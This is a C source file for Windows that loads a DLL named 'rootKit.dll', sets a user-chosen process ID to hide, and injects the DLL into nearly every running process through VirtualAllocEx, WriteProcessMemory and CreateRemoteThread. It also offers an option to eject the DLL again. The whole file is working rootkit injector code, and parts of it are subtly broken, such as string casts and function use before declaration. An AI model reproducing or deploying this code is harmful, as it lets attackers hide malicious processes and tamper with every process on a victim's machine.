#include<stdio.h>
#include<Windows.h>
#include<direct.h>
#include<string.h>
#include<conio.h>
#include<TlHelp32.h>
#include <tchar.h>

#define DIRECTORY_PATH 500
#define DLLNAME_PATH 256
#define DLLNAME "rootKit.dll"
#define DLL_L_NAME (L"rootKit.dll")
#define F_OK 0

typedef void(*PFN_SetProcPid)(LPINT pPid);

int main()
{
	char curDir[DIRECTORY_PATH] = {0,};
	int input = 0;
	LPCWSTR szDllName=NULL;
	HMODULE hLib;

	_getcwd(curDir, DIRECTORY_PATH);
	strcat_s(curDir, DIRECTORY_PATH, "\\");
	strcat_s(curDir, DIRECTORY_PATH, DLLNAME);
	szDllName = (LPCWSTR)curDir;

	printf("%s\n", curDir);

	hLib = LoadLibraryA(curDir);
	if (hLib == NULL)
	{
		printf("There is no Dll\n");
		_getch();
		return 1;
	}

	printf("[1]DLL Injection\n");
	printf("[2]DLL Ejection\n");
	scanf_s("%d", &input,sizeof(int));

	switch (input) {
	case 1: injection(hLib, szDllName);
		break;
	case 2: ejection(szDllName);
		break;
	default: return -1;
	}
	
}

BOOL injection(HMODULE hLib, LPCWSTR szDllName)
{
	PFN_SetProcPid setPid = NULL;
	LPINT processPID = 0;
	HANDLE snapShot;
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(PROCESSENTRY32);

	setPid = (PFN_SetProcPid)GetProcAddress(hLib, "SetProcPid");

	printf("Hide Process PID:");
	scanf_s("%d", &processPID);
	setPid(processPID);

	snapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	Process32First(snapShot, &pEntry);
	do {
		if (pEntry.th32ProcessID > 100)
			injectDll(pEntry.th32ProcessID, szDllName);
	} while (Process32Next(snapShot, &pEntry));

	return 0;
}

BOOL ejection(LPCWSTR szDllName)
{
	HANDLE pSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	HANDLE mSnapShot = NULL;
	PROCESSENTRY32 pEntry;
	MODULEENTRY32 mEntry;
	mEntry.dwSize = sizeof(MODULEENTRY32);
	pEntry.dwSize = sizeof(PROCESSENTRY32);

	Process32First(pSnapShot, &pEntry);
	do {
		mSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pEntry.th32ProcessID);
		Module32First(mSnapShot, &mEntry);
		do {
			if (!_tcsicmp(mEntry.szModule, DLL_L_NAME) || !_tcsicmp(mEntry.szExePath,szDllName))
			{
				printf("%S\n%S\n", mEntry.szModule, mEntry.szExePath);
				ejectDll(mEntry.th32ProcessID, szDllName, mEntry);
			}
		} while (Module32Next(mSnapShot, &mEntry));
	} while (Process32Next(pSnapShot, &pEntry));

	CloseHandle(pSnapShot);
	CloseHandle(mSnapShot);

	return 0;
}

BOOL injectDll(DWORD pPid, LPCWSTR szDllName)
{
	LPVOID pRemoteBuf;
	HMODULE hMod;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pPid), hThread;
	LPTHREAD_START_ROUTINE pThreadProc;

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, lstrlen(szDllName) + 1, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProcess, pRemoteBuf, szDllName, lstrlen(szDllName) + 1, NULL);

	hMod = GetModuleHandle(L"kernel32.dll");
	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, "LoadLibraryA");

	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hProcess);
	CloseHandle(hThread);

	return TRUE;
}

BOOL ejectDll(DWORD pid,LPCWSTR szDllName, MODULEENTRY32 mEntry)
{
	HMODULE hModule = GetModuleHandle(L"kernel32.dll");
	HANDLE hThread, hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	LPTHREAD_START_ROUTINE pThreadProc = GetProcAddress(hModule, "FreeLibrary");

	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, mEntry.modBaseAddr, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return TRUE;
}